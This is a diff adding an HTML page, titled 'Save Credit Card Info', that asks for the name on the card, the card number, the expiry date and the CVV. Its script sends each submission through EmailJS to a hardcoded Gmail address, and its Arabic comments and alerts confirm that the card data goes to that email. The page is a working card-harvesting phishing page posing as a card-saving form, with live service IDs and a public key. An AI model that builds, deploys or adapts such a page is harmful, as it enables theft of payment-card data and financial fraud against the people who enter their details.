@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Save Credit Card Info</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 1em;
+      background: #f4f4f4;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+      background: white;
+      padding: 2em;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    }
+    input, button {
+      width: 100%;
+      padding: 1em;
+      margin-top: 1em;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 1em;
+    }
+    button {
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+  <script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function() {
+      emailjs.init("K25NIpkgW8OAHCjD9"); // تم تحديث المفتاح العام هنا
+    })();
+  </script>
+</head>
+<body>
+  <div class="container">
+    <h2>Save Your Card Info</h2>
+    <form id="cardForm">
+      <input type="text" name="name" placeholder="Name on Card" required />
+      <input type="text" name="card_number" placeholder="Card Number" required />
+      <input type="text" name="expiry" placeholder="MM/YY" required />
+      <input type="text" name="cvv" placeholder="CVV" required />
+      <button type="submit">Save Card</button>
+    </form>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const form = document.getElementById('cardForm');
+      const recipientEmail = "chizbnznzn@gmail.com"; // بريدك الإلكتروني هنا
+
+      if (form) {
+        form.addEventListener('submit', function(event) {
+          event.preventDefault();
+
+          const formData = {
+            name: this.name.value,
+            card_number: this.card_number.value,
+            expiry: this.expiry.value,
+            cvv: this.cvv.value,
+            to_email: recipientEmail // يمكنك تضمين بريد المستلم هنا أو في القالب
+          };
+
+          emailjs.send('service_s8q3n6i', 'template_7fqzu6r', formData)
+            .then(function(response) {
+              console.log('SUCCESS!', response.status, response.text);
+              alert('تم إرسال بيانات البطاقة بنجاح إلى البريد الإلكتروني!');
+              form.reset();
+            }, function(error) {
+              console.log('FAILED...', error);
+              alert('حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.');
+            });
+        });
+      }
+    });
+  </script>
+</body>
+</html>
